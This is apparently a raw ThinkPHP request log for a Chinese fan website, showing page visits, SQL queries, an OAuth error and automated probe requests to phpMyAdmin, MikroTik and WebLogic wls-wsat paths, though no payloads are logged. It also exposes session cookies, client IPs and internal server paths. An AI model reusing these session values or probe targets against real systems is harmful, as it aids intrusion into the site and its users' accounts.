  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,image/sharpp,image/apng,*/*;q=0.8',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Chat->index[ /home/www/WWW/application/index/controller/Chat.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/chat/index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:26:37+08:00 ] 172.16.0.5 121.51.14.25 POST /index/chat/more.html
[ log ] zard-forever.com/index/chat/more.html [运行时间：0.057946s][吞吐率：17.26req/s] [内存消耗：2,508.27kb] [文件加载：55]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'chat',
    2 => 'more',
  ),
)
[ info ] [ HEADER ] array (
  'x-requested-with' => 'XMLHttpRequest',
  'x-forwarded-for-pound' => '117.136.41.55',
  'x-forwarded-for' => '117.136.41.55',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 6.0; zh-cn; M5 Note Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.132 MQQBrowser/8.3 Mobile Safari/537.36',
  'referer' => 'http://zard-forever.com/index/chat/index.html',
  'origin' => 'http://zard-forever.com',
  'host' => 'zard-forever.com',
  'cookie' => 'PHPSESSID=qvn6qtbgpih10n30av6dehjh2p',
  'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
  'content-length' => '3',
  'connection' => 'close',
  'accept-language' => 'zh-CN,en-US;q=0.8',
  'accept-encoding' => 'gzip',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
)
[ info ] [ PARAM ] array (
  'id' => '',
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Chat->more[ /home/www/WWW/application/index/controller/Chat.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000226s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `chat` [ RunTime:0.000559s ]
[ sql ] [ SQL ] SELECT * FROM `chat` ORDER BY id desc LIMIT 0,5 [ RunTime:0.000127s ]

---------------------------------------------------------------
[ 2018-05-05T11:26:49+08:00 ] 172.16.0.5 117.185.117.56 GET /index/mv/index.html
[ log ] zard-forever.com/index/mv/index.html [运行时间：0.023239s][吞吐率：43.03req/s] [内存消耗：2,683.32kb] [文件加载：58]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'mv',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'zard-forever.com',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'referer' => 'http://zard-forever.com/index/index/index.html',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; HUAWEI ALE-CL00 Build/HuaweiALE-CL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.0.907 Mobile Safari/537.36',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Mv->index[ /home/www/WWW/application/index/controller/Mv.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/mv/index.html [ array (
  0 => 'nickname',
  1 => 'value',
  2 => 'data',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000231s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `mv` [ RunTime:0.000605s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 LIMIT 1 [ RunTime:0.000151s ]
[ sql ] [ SQL ] SELECT * FROM `mv` WHERE  `outer_address` <> ''  AND `type` = 0 ORDER BY `id` LIMIT 0,20 [ RunTime:0.000165s ]

---------------------------------------------------------------
[ 2018-05-05T11:27:11+08:00 ] 172.16.0.5 120.204.17.72 GET /index/picture/index.html
[ log ] zard-forever.com/index/picture/index.html [运行时间：0.022319s][吞吐率：44.80req/s] [内存消耗：2,594.16kb] [文件加载：55]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'picture',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'zard-forever.com',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'referer' => 'http://zard-forever.com/index/index/index.html',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 5.1.1; SM801 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko)     		Chrome/46.0.2490.11 Mobile Safari/537.36',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Picture->index[ /home/www/WWW/application/index/controller/Picture.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/picture/index.html [ array (
  0 => 'picture',
  1 => 'first_selected',
  2 => 'second_selected',
  3 => 'first',
  4 => 'second',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000242s ] mysql:dbname=zard;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `picture` [ RunTime:0.000598s ]
[ sql ] [ SQL ] SELECT * FROM `picture` WHERE  `first_type` = 0  AND `second_type` = 0 ORDER BY id asc LIMIT 15 [ RunTime:0.000173s ]

---------------------------------------------------------------
[ 2018-05-05T11:27:25+08:00 ] 172.16.0.5 120.204.17.70 GET /index/chat/index.html
[ log ] zard-forever.com/index/chat/index.html [运行时间：0.022202s][吞吐率：45.04req/s] [内存消耗：1,669.66kb] [文件加载：48]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'chat',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'zard-forever.com',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'referer' => 'http://zard-forever.com/index/index/index.html',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T11:27:25+08:00 ] 172.16.0.5 120.204.17.70 GET /index/login/login.html
[ log ] zard-forever.com/index/login/login.html [运行时间：0.014365s][吞吐率：69.61req/s] [内存消耗：1,696.77kb] [文件加载：51]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'host' => 'zard-forever.com',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.6,en;q=0.4',
  'cookie' => 'PHPSESSID=gs7sdbj7hf8lgfue5l28gooi5c',
  'referer' => 'http://zard-forever.com/index/chat/index.html',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Linux; U; Android 4.4.4; zh-CN; Coolpad Y82-520 Build/KTU84P) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/10.9.8.738 U3/0.8.0 Mobile Safari/534.30',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->login[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T12:59:57+08:00 ] 172.16.0.5 60.191.52.254 HEAD /
[ log ] wap.ip138.com/ [运行时间：0.014192s][吞吐率：70.46req/s] [内存消耗：1,677.95kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'proxy-connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'wap.ip138.com',
  'user-agent' => 'Java/1.8.0_77',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T14:03:47+08:00 ] 172.16.0.5 112.90.82.218 GET /index/login/login.html
[ log ] zard-forever.com/index/login/login.html [运行时间：0.014060s][吞吐率：71.12req/s] [内存消耗：1,694.82kb] [文件加载：51]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->login[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T14:03:47+08:00 ] 172.16.0.5 112.90.82.218 GET /index/login/index.html&amp;state&
[ log ] zard-forever.com/index/login/index.html&amp;state& [运行时间：0.015579s][吞吐率：64.19req/s] [内存消耗：1,754.47kb] [文件加载：55]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'referer' => 'http://zard-forever.com/index/login/login.html',
  'accept-encoding' => 'deflate, gzip',
  'host' => 'zard-forever.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'amp;state' => '',
)
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ RUN ] app\index\controller\Login->index[ /home/www/WWW/application/index/controller/Login.php ]
[ info ] [ LOG ] INIT File
[ error ] [8]未定义数组索引: state[/home/www/WWW/vendor/api/class/Oauth.php:57]

---------------------------------------------------------------
[ 2018-05-05T15:18:18+08:00 ] 172.16.0.5 43.226.39.133 GET /phpmyadmin
[ log ] 123.207.34.110/phpmyadmin [运行时间：0.011769s][吞吐率：84.97req/s] [内存消耗：1,357.96kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'phpmyadmin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
  'referer' => 'http://123.207.34.110/phpmyadmin',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'Keep-Alive',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T17:09:53+08:00 ] 172.16.0.5 190.181.40.250 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.014417s][吞吐率：69.36req/s] [内存消耗：1,678.09kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T17:35:27+08:00 ] 172.16.0.5 101.226.64.174 GET /phpmyadmin
[ log ] 123.207.34.110/phpmyadmin [运行时间：0.012375s][吞吐率：80.81req/s] [内存消耗：1,356.73kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'phpmyadmin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T17:47:30+08:00 ] 172.16.0.5 47.93.112.232 GET /
[ log ] 111.231.83.224:8000/ [运行时间：0.014745s][吞吐率：67.82req/s] [内存消耗：1,677.87kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'connection' => 'Close',
  'host' => '111.231.83.224:8000',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T18:07:17+08:00 ] 172.16.0.5 116.114.216.147 GET /
[ log ] 123.207.34.110/ [运行时间：0.013541s][吞吐率：73.85req/s] [内存消耗：1,677.62kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T18:32:16+08:00 ] 172.16.0.5 188.92.74.189 GET /webfig/roteros.info
[ log ] 123.207.34.110/webfig/roteros.info [运行时间：0.012117s][吞吐率：82.53req/s] [内存消耗：1,356.11kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'webfig',
    1 => 'roteros.info',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'python-requests/2.18.4',
  'accept' => '*/*',
  'accept-encoding' => 'gzip, deflate',
  'connection' => 'close',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T18:47:39+08:00 ] 172.16.0.5 107.170.193.73 GET /
[ log ] 123.207.34.110/ [运行时间：0.016368s][吞吐率：61.09req/s] [内存消耗：1,678.06kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '123.207.34.110',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T22:48:42+08:00 ] 172.16.0.5 103.242.0.14 POST /wls-wsat/CoordinatorPortType
[ log ] 123.207.34.110:80/wls-wsat/CoordinatorPortType [运行时间：0.011936s][吞吐率：83.78req/s] [内存消耗：1,356.66kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '1195',
  'content-type' => 'text/xml',
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0',
  'host' => '123.207.34.110:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T22:48:42+08:00 ] 172.16.0.5 103.242.0.14 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.013894s][吞吐率：71.97req/s] [内存消耗：1,678.09kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T22:59:40+08:00 ] 172.16.0.5 58.87.91.20 POST /wls-wsat/CoordinatorPortType
[ log ] 123.207.34.110:80/wls-wsat/CoordinatorPortType [运行时间：0.013245s][吞吐率：75.50req/s] [内存消耗：1,356.66kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '1195',
  'content-type' => 'text/xml',
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0',
  'host' => '123.207.34.110:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T22:59:40+08:00 ] 172.16.0.5 58.87.91.20 GET /index.php
[ log ] 123.207.34.110/index.php [运行时间：0.015659s][吞吐率：63.86req/s] [内存消耗：1,678.09kb] [文件加载：46]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '123.207.34.110',
  'user-agent' => 'Mozilla/5.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /home/www/WWW/application/index/controller/Index.php ]
[ info ] [ VIEW ] /home/www/WWW/public/../application/index/view/index/index.html [ array (
  0 => 'audio',
) ]
[ info ] [ SESSION ] INIT array (
  'id' => '',
  'var_session_id' => '',
  'prefix' => 'think',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2018-05-05T23:17:24+08:00 ] 172.16.0.5 47.75.42.96 POST /wls-wsat/CoordinatorPortType
[ log ] 123.207.34.110:80/wls-wsat/CoordinatorPortType [运行时间：0.012640s][吞吐率：79.11req/s] [内存消耗：1,356.66kb] [文件加载：40]
[ info ] [ LANG ] /home/www/WWW/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'wls-wsat',
    1 => 'CoordinatorPortType',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '1195',
  'content-type' => 'text/xml',
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0',
  'host' => '123.207.34.110:80',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
